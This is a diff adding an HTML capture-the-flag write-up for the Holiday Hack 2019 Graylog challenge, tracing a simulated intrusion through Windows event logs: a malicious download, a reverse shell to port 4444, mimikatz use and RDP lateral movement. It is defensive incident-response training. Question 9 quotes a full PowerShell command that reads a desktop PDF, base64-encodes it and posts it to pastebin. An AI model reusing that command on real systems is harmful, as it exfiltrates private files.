@@ -1,0 +1,59 @@
+<!DOCTYPE html5>
+<html>
+	<head>
+		<title>graylog | Holiday Hack 2019</title>
+		<link rel="stylesheet" href="/css/common.css">
+		<link rel="stylesheet" href="/css/writeup.css">
+		<link rel="stylesheet" href="/css/pygments.css">
+		<link rel="stylesheet" href="https://unpkg.com/normalize.css@8.0.1/normalize.css">
+		
+		<meta charset="utf-8" />
+	</head>
+	<body>
+		<main>
+			<h1>Graylog</h1>
+<p>Graylog is a log collection and searching program, like splunk. We're told an attack happened and we need to investigate it.</p>
+<h1>Question 1</h1>
+<p>We're looking for new applications being launched which is <code>EventID: 1</code> (Process created). From here we can add the <code>CommandLine</code> column to the table and scroll through to look for anything suspicous. We can narrow it down even further by adding <code>AND UserAccount: minty</code>.</p>
+<p>From here, we find <code>C:\Users\minty\Downloads\cookie_recipe.exe</code> which is pretty obviously the malicious file.</p>
+<h1>Question 2</h1>
+<p>We can now use this binary path as a value for <code>ProcessImage</code>, which gives us a connection established event to DEFANELF:4444, or in ip form, 192.168.247.175:4444</p>
+<h1>Question 3</h1>
+<p>We can use the same binary path as ParentProcessImage to see all the commands they executed with their initial shell. The first command was <code>whoami</code></p>
+<h1>Question 4</h1>
+<p>Using the same search as before, we can keep scrolling to find a bunch of calls to <code>sc</code> which target <code>webexservice</code>.</p>
+<h1>Question 5</h1>
+<p>From the previous search, we see the new service is calling <code>C:\Users\minty\Downloads\cookie_recipe2.exe</code>. We use this as our new <code>ParentProcessImage</code> and see <code>C:\cookie.exe</code> with what looks like mimikatz invocation arguments.</p>
+<h1>Question 6</h1>
+<p>We can search for EventID: 4624 (An account was successfully logged on). From here, we can look at the quick values for <code>SourceHostName</code> and find <code>DEFANELF</code>, the same hostname from question 2. Filtering only events with this <code>SourceHostName</code> we see all 14 values are with <code>AccountName: alabaster</code>.</p>
+<h1>Question 7</h1>
+<p>We can look for remote desktop logins with <code>LogonType: 10</code> and see one with the user account <code>alabaster</code>. Since we know this account is compromised, it's safe to assume this is the attacker.</p>
+<h1>Question 8</h1>
+<p>First, we look for connections from the workstation that was RDPed to: <code>EventID: 3 AND source: elfu-res-wks2</code>. We can narrow this further by only searching for connections after <code>2019-11-19 06:04:28</code> (when the RDP session started), as well as adding <code>AND UserAccount: alabaster</code>. 
+We see something from <code>explorer.exe</code>, which indicates they're using something native to windows, rather than another backdoor/C2.
+We can then search again for <code>EventID: 4624</code> (Logged in), This time narrowing it down with <code>SourceHostName: ELFU-RES-WKS2</code> (Windows capitalises it here for whatever reason). We see a bunch of logins to <code>alabaster</code> from the compromised computer, all with LogonType <code>3</code> (Network).</p>
+<h1>Question 9</h1>
+<p>Searching for processes created on elfu-res-wks2, We see a powershell process with the following invocation:</p>
+<div class="codehilite"><pre><span></span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SysWOW64</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">pastebin</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">post</span><span class="p">.</span><span class="n">php</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Body</span> <span class="p">@{</span> <span class="s2">&quot;submit_hidden&quot;</span> <span class="p">=</span> <span class="s2">&quot;submit_hidden&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_code&quot;</span> <span class="p">=</span> <span class="p">$(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&quot;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&quot;</span><span class="p">)));</span> <span class="s2">&quot;paste_format&quot;</span> <span class="p">=</span> <span class="s2">&quot;1&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_expire_date&quot;</span> <span class="p">=</span> <span class="s2">&quot;N&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_private&quot;</span> <span class="p">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span> <span class="s2">&quot;paste_name&quot;</span><span class="p">=</span><span class="s2">&quot;cookie recipe&quot;</span> <span class="p">}</span>
+</pre></div>
+
+
+<p>This means we're reading from <code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code>, which is probably the super secret research.</p>
+<h1>Question 10</h1>
+<p>We can search for messages surrounding the previous and see the Network Connection event, with DestinationIp <code>104.22.3.84</code>.</p>
+		</main>
+
+		<footer>
+			<div class="links">
+				<div>
+					<a aria-label="Back" href="index.html">
+						<span class="iconify" data-icon="fa:arrow-left"></span>
+					</a>
+				</div>
+				<div>
+			</div>
+		</footer>
+
+		<script src="https://code.iconify.design/1/1.0.3/iconify.min.js"></script>
+	</body>
+</html>
